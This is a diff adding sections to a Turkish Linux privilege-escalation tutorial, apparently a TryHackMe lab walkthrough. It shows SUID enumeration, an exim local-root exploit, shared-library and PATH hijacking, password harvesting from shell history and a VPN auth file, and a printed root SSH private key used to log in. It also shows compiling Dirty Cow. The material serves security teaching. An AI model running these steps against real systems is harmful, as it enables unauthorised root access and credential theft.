@@ -455,3 +455,338 @@ Bizim örneğimizde 1 dosya yedekledikten sonra oluşturduğumuz zararlı yazıl
 SUID bit ayarlandığında, bir dosya çalıştırıldığında bu dosya, çalıştıran kullanıcının kimliği yerine dosyanın sahibinin kimliği ile çalışır. Bu, kullanıcının sahip olmadığı bazı ayrıcalıklara sahip olabileceği anlamına gelir.
 
 SGID bit ayarlandığında, bir dosya çalıştırıldığında bu dosya, çalıştıran kullanıcının grup kimliği yerine dosyanın grup kimliği ile çalışır. Bu, dosyanın sahibi değil de, dosyanın grubuna atanmış haklar üzerinden çalışmasını sağlar.
+
+Sistemde bulunan SUID ve SGID bitlerine sahip olan uygulamaları bulmak için şu komutu yazmalıyız.
+
+```
+find / -type f -perm -u=s 2>/dev/null
+// SUID biti taraması
+```
+
+```
+find / -type f -perm -g=s 2>/dev/null
+// SGID biti taraması
+```
+
+Karşımızı çıkan sonuçlardan bazılarında zafiyet bulunabilir. Örnek senaryomuzda /usr/sbin/exim-4.84.3 uygulamasında zafiyet bulunmakta.
+
+```
+user@debian:~$ find / -type f -perm -u=s 2>/dev/null
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2
+// !!!!!!!!!!!!!!!!!!
+/usr/sbin/exim-4.84-3
+// zafiyetli
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/sbin/mount.nfs
+```
+
+Bu zafiyeti /home/user/tools/suid/exim altında bulunan cve-2016-1531.sh dosyası bizim root yetkilerine sahip olmamız için kullanacağız.
+
+```
+user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
+[ CVE-2016-1531 local root exploit
+sh-4.1# whoami
+root
+```
+
+### SUID/SGID Shared Object
+
+Sistemde çalışan uygulamalar sistemde bulunan bazı küütphaneleri kullanır. Bu kütüphanleri görmek için strace komutu kullanılır. Bizim burada yapacağımız şey uygulamanın kullandığı kütüphaneleri kontrol edip kendi kütüphanemizi ekleyebiliriz.
+
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+```
+
+Komutuyla sistemde bulunan hangi kütüphanelerin kullanıldığını görebiliyoruz. `/usr/local/bin/suid-so` dosyası aşşağıdaki dosyaları kullanır.&#x20;
+
+```
+user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+```
+
+En altta `/home/user/.config/libcalc.so` adında bir kütüphaneden bahsediyor. Ama böyle bizim böyle bir dosyamız bulunmuyor. /home/user altında .config diye bir klasör oluşturuyoruz. /home/user/tools/suid/ altında bulunan libcalc.c dosyasını derleyip libcalc.so adıyla kaydetmemiz gerekiyor.
+
+```
+user@debian:~$ mkdir .config
+user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c 
+user@debian:~$ ls .config/
+libcalc.so
+user@debian:~$ /usr/local/bin/suid-so
+Calculating something, please wait...
+bash-4.1# whoami
+root
+```
+
+### SUID/SGID Path
+
+Bu sefer uygulamaların kullandığı kütüphanelerin mutlak bir yol şeklinde belirtilmemesinden dolayı programları kötüye kullanılabiliriz.
+
+Bu örneğimiz için /usr/local/bin/suid-env uygulamasını kullanacağız.&#x20;
+
+`string /usr/local/bin/suid-env` belirtilen dosya içindeki okunabilir karakter dizilerini ekrana yazdırmak için kullanılır.
+
+```
+user@debian:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+```
+
+En alt satırda bulunan service kelimesi /usr/sbin/service bu şekilde belirtilmesi gerekiyordu. Eğer biz service isminde başka bir dosya düzenlersek ve PATH değerine service dosyasının bulunduğu dizin değerini verirsek başarıyla root oluruz.
+
+```
+user@debian:~/tools/suid$ ls
+exim  libcalc.c  service  service.c
+user@debian:~/tools/suid$ mv service /home/user/service
+user@debian:~/tools/suid$ cd 
+user@debian:~$ ls
+myvpn.ovpn  service  tools
+user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
+root@debian:~# whoami
+root
+```
+
+### History & Config Files
+
+Bazı senaryolarda kullanıcılar komut satırında daha öncesinde şifrelerini kullanmış olabilirler. Bizim bu senaryomuzda da bu durum söz konusu.&#x20;
+
+```
+user@debian:~$ ls -al
+total 68
+drwxr-xr-x 6 user user 4096 Sep 12 14:30 .
+drwxr-xr-x 3 root root 4096 May 15  2017 ..
+-rw------- 1 user user  186 Sep 12 14:33 .bash_history
+-rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
+-rw-r--r-- 1 user user 3235 May 14  2017 .bashrc
+drwxr-xr-x 2 user user 4096 Sep 12 14:00 .config
+drwxr-xr-x 2 user user 4096 May 13  2017 .irssi
+drwx------ 2 user user 4096 May 15  2020 .john
+-rw------- 1 user user  137 May 15  2017 .lesshst
+-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
+-rw------- 1 user user   11 Sep 12 14:35 .nano_history
+-rw-r--r-- 1 user user  725 May 13  2017 .profile
+-rwxr-xr-x 1 user user 6697 Sep 12 14:30 service
+drwxr-xr-x 8 user user 4096 May 15  2020 tools
+-rw------- 1 user user 6334 May 15  2020 .viminfo
+
+user@debian:~$ cat .bash_history 
+ls -al
+cat .bash_history 
+ls -al
+mysql -h somehost.local -uroot -ppassword123
+exit
+cd /tmp
+clear
+ifconfig
+netstat -antp
+nano myvpn.ovpn 
+ls
+whoami
+exit
+whoami
+exit
+whoami
+clear
+exi
+exit
+```
+
+Ayrıca hedef sistemimizde myvpn.ovpn dosyası var ve bu dosyayı okuyabiliyoruz.&#x20;
+
+```
+user@debian:~$ cat myvpn.ovpn 
+client
+dev tun
+proto udp
+remote 10.10.10.10 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca ca.crt
+tls-client
+remote-cert-tls server
+auth-user-pass /etc/openvpn/auth.txt
+comp-lzo
+verb 1
+reneg-sec 0
+```
+
+/etcc/oopenvpn/auth.txt dosyasında büyük ihtimalle bağlanırken kullandığımız kullanıcı adı ve şifre bulunuyor.
+
+```
+user@debian:~$ cat /etc/openvpn/auth.txt 
+root
+password123
+```
+
+### SSH key
+
+Sistemlere SSH anahtarlarıyla bağlanabiliriz. Bu SSH keyleri kullanıcın /home dosyaları altında gizli dosya olarak bulunur ya da / (kök) altında gizli dosya olarak bulunur.
+
+Öncelikle sistemin / (kök) altında sahip olduğu bütün dosyaları görelim.
+
+```
+user@debian:~$ ls -al /
+total 96
+drwxr-xr-x 22 root root  4096 Aug 25  2019 .
+drwxr-xr-x 22 root root  4096 Aug 25  2019 ..
+drwxr-xr-x  2 root root  4096 Aug 25  2019 bin
+drwxr-xr-x  3 root root  4096 May 12  2017 boot
+drwxr-xr-x 12 root root  2820 Sep 12 13:28 dev
+drwxr-xr-x 67 root root  4096 Sep 12 14:50 etc
+drwxr-xr-x  3 root root  4096 May 15  2017 home
+lrwxrwxrwx  1 root root    30 May 12  2017 initrd.img -> boot/initrd.img-2.6.32-5-amd64
+drwxr-xr-x 12 root root 12288 May 14  2017 lib
+lrwxrwxrwx  1 root root     4 May 12  2017 lib64 -> /lib
+drwx------  2 root root 16384 May 12  2017 lost+found
+drwxr-xr-x  3 root root  4096 May 12  2017 media
+drwxr-xr-x  2 root root  4096 Jun 11  2014 mnt
+drwxr-xr-x  2 root root  4096 May 12  2017 opt
+dr-xr-xr-x 96 root root     0 Sep 12 13:26 proc
+drwx------  5 root root  4096 May 15  2020 root
+drwxr-xr-x  2 root root  4096 May 13  2017 sbin
+drwxr-xr-x  2 root root  4096 Jul 21  2010 selinux
+drwxr-xr-x  2 root root  4096 May 12  2017 srv
+drwxr-xr-x  2 root root  4096 Aug 25  2019 .ssh
+drwxr-xr-x 13 root root     0 Sep 12 13:26 sys
+drwxrwxrwt  2 root root  4096 Sep 12 14:58 tmp
+drwxr-xr-x 11 root root  4096 May 13  2017 usr
+drwxr-xr-x 14 root root  4096 May 13  2017 var
+lrwxrwxrwx  1 root root    27 May 12  2017 vmlinuz -> boot/vmlinuz-2.6.32-5-amd64
+```
+
+/ (kök) altında .ssh adında bir dosya var içinde de root\_key adında bir dosya var. Bu dosya sayesinde hedef sisteme root yetkileriyle bağlanabiliriz.&#x20;
+
+```
+user@debian:/.ssh$ cat root_key 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
+gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
+p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
+OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
+eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
+Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
+NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
+YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
+5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
+WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
+VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
+6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
+1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
+824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
+Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
+U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
+Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
+SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
+d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
+jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
+871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
+X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
+CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
+Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
+LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
+-----END RSA PRIVATE KEY-----
+```
+
+Bu key değerini kendi bilgisayarımıza id\_rsa adıyla kayıt ediyoruz. SSH bağlantısı yaparken -i parametresiyle bu dosyayı bildireceğiz ve giriş yapacağız. Yeni bir dosya açıp SSH ile bağlanmaya çalıştığımızda sistem bize hata vericektir. Dosya olarak oluşturduğumuz key değerini herkesin görmemesi gerektiğini söyleyip dosya üzerinde izinleri değiştirmemiz gerekiyor.
+
+```
+root@ip-10-10-101-154:~# ssh root@10.10.48.240 -i id_rsa 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+```
+
+```
+root@ip-10-10-101-154:~# chmod 700 id_rsa 
+root@ip-10-10-101-154:~# ssh root@10.10.48.240 -i id_rsa 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
+root@debian:~# whoami
+root
+```
+
+### Kernel Exploit
+
+Kernel exploit, sistemi kararsız bir durumda bırakabilir; bu nedenle bunları yalnızca son çare olarak çalıştırmalısınız.
+
+Kullandığımız çekirdeğin zafiyetli olup olmadığını öğrenmek için öncelikle hangi çekirdek versiyonunu kullandığımızı öğrenmemiz gerekiyor.&#x20;
+
+```
+user@debian:/.ssh$ uname -a
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
+```
+
+Google'da `2.6.32-5 linux`  kelimesini arattığımızda karşımıza Dirty Cow adında bir exploit çıkıyor. Exploiti /home/user/tools/kernel-exploits/dirtycow dizini altında c0w.c adıyla bulunuyor.
+
+```
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+```
+
+Komutuyla derledikten sonra ./c0w diyerek çalıştırıyoruz. Komut tamamlandıktan sonra passwd komutuyla root yetkilerine sahip oluyoruz.
+
+### Hazır Scriptler
+
+Hedef sistemlerde yaptığımız bu manuel taramaları yazılmış çeşitli otomatik araçlarla yapabiliriz.
+
+{% embed url="https://github.com/rebootuser/LinEnum" %}
+
+{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}
+
+{% embed url="https://github.com/jondonas/linux-exploit-suggester-2" %}
+
+{% embed url="https://tryhackme.com/r/room/linuxprivesc" %}
